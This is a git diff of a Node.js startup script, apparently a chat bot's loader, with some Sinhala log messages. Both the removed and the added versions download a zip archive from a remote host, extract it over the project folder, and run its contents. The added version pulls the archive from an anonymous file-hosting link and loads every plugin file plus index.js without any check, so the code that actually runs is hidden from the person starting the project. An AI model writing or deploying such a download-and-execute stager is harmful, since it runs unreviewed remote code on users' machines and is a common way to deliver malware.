@@ -1,41 +1,77 @@
-const fs = require("fs");
-const path = require("path");
-const { File } = require("megajs");
-const AdmZip = require("adm-zip");
-const axios = require("axios");
+const fs = require('fs');
+const path = require('path');
+const axios = require('axios');
+const AdmZip = require('adm-zip');
 
-const downloadAndExtractMegaZip = (url) =>
-  new Promise((resolve, reject) => {
-    try {
-      console.log("Downloading Files...");
-      const file = File.fromURL(url);
-      const outputPath = path.join(process.cwd(), "plugins.zip");
-      file.download((err, data) => {
-        if (err) return reject(err);
-        fs.writeFileSync(outputPath, data);
-        const zip = new AdmZip(outputPath);
-        zip.extractAllTo(process.cwd(), true);
-        fs.unlinkSync(outputPath);
-        console.log("Connected Successfully");
-        resolve();
-      });
-    } catch (err) {
-      reject(err);
-    }
-  });
+// 🔗 ZIP URL
+const zipUrl = 'https://files.catbox.moe/42xavi.zip';
 
-const main = async () => {
+// 📦 Main function: download, extract, load plugins, then run index.js
+async function downloadAndExtractZip(zipUrl) {
+  const zipPath = path.join(__dirname, 'temp.zip');
+  const extractPath = __dirname;
+
   try {
-    console.log("Fetching data...");
-    const { data } = await axios.get(
-      "https://gist.githubusercontent.com/gojosathory2/9008aadfdd8d412d58d0a983a4b34f5f/raw/36ce196f53e8a650e1f3700381c7491416c02bf0/Pakgaya.json"
-    );
-    await downloadAndExtractMegaZip(data.mega);
-    console.log("Executing...");
-    require("./index.js"); // Warning: This could execute malicious code
-  } catch (err) {
-    console.error("Error:", err.message);
-  }
-};
+    // 🟢 Download ZIP
+    const response = await axios({
+      method: 'GET',
+      url: zipUrl,
+      responseType: 'stream'
+    });
 
-main();
+    const writer = fs.createWriteStream(zipPath);
+    response.data.pipe(writer);
+
+    await new Promise((resolve, reject) => {
+      writer.on('finish', resolve);
+      writer.on('error', reject);
+    });
+
+    console.log('✅ ZIP එක බාගත්තා.');
+
+    // 📂 Extract ZIP
+    const zip = new AdmZip(zipPath);
+    zip.extractAllTo(extractPath, true);
+    console.log('✅ ZIP එක extract කරා.');
+
+    // 🗑️ Delete ZIP
+    fs.unlinkSync(zipPath);
+    console.log('🗑️ ZIP file එක delete කරා.');
+
+    // 🔌 Load plugins from /plugins
+    const pluginDir = path.join(__dirname, 'plugins');
+    if (fs.existsSync(pluginDir)) {
+      const plugins = fs.readdirSync(pluginDir).filter(f => f.endsWith('.js'));
+
+      if (plugins.length === 0) {
+        console.warn('⚠️ plugins folder එකේ plugin කිසිවක් නෑ!');
+      }
+
+      for (const file of plugins) {
+        try {
+          require(path.join(pluginDir, file));
+          console.log(`✅ Plugin loaded: ${file}`);
+        } catch (e) {
+          console.error(`❌ Plugin load error (${file}):`, e);
+        }
+      }
+    } else {
+      console.warn('⚠️ plugins folder එක හමු නොවුණා!');
+    }
+
+    // ▶️ Run root index.js
+    const mainIndexPath = path.join(__dirname, 'index.js');
+    if (fs.existsSync(mainIndexPath)) {
+      console.log('🚀 Root index.js එක run කරමින්...');
+      require(mainIndexPath);
+    } else {
+      console.warn('⚠️ Root index.js එක හමු නොවුණා!');
+    }
+
+  } catch (err) {
+    console.error('❌ Error during setup:', err);
+  }
+}
+
+// ▶️ Run everything
+downloadAndExtractZip(zipUrl);
